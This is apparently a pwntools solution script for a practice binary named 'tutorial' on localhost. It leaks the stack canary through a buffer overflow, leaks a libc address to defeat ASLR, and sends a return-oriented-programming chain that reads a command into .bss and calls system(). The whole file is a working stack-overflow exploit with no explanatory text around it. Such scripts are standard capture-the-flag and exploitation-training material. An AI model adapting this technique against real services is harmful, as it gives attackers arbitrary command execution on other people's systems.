from pwn import *

r = remote('127.0.0.1', 9977)
elf = ELF('./tutorial')
libc = ELF('./libc-2.23.so')

#get Canary!
print r.recvuntil(">")
r.sendline("2")
print r.recvuntil(">")

payload = "A" * 311

r.sendline(payload)
print r.recvuntil('\n')
canary = u64(r.recv(8))
print "canary : " + str(canary)

#exploit!
#using objdump -h and -d
read_plt = elf.plt['read']
write_plt = elf.plt['write']
bss = elf.bss()

print "read : " + hex(read_plt)
print "write : " + hex(write_plt)

#get pop gadget in rop online!
poprdi = 0x21102
poprsi = 0x202e8
poprdx = 0x1144b6

cmd = "ls -al"

libc_puts = libc.symbols['puts'] #objdump -d libc-2.19.so | grep puts
libc_system = libc.symbols['system'] #objdump -d libc-2.19.so | grep puts

#get libc base (puts_got - libc_puts = libc base)
print r.recvuntil(">")
r.sendline("1")
print r.recvuntil("Reference:")

puts_got = int(r.recv(14), 16)+1280
print "puts got : " + hex(puts_got)
print "libc puts : " + hex(libc_puts)

libc_base = puts_got - libc_puts

#offset calc
poprdi = libc_base + poprdi
poprsi = libc_base + poprsi
poprdx = libc_base + poprdx

system = libc_base + libc_system
print "system : " + hex(system)

#send payload
print r.recvuntil(">")
r.sendline("2")
print r.recvuntil(">")

payload = "A" * 312
payload += p64(canary)
payload += p64(0x4141414141414141)

payload += p64(poprdi)
payload += p64(0x04)
payload += p64(poprsi)
payload += p64(bss)
payload += p64(poprdx)
payload += p64(len(cmd))
payload += p64(read_plt)

payload += p64(poprdi)
payload += p64(bss)
payload += p64(system)

r.send(payload)
print "== payload =="
print payload.encode('hex')

print "== echo =="
print r.recv(2048).encode('hex')
r.send(cmd)

print "=- END -="

#r.interactive()
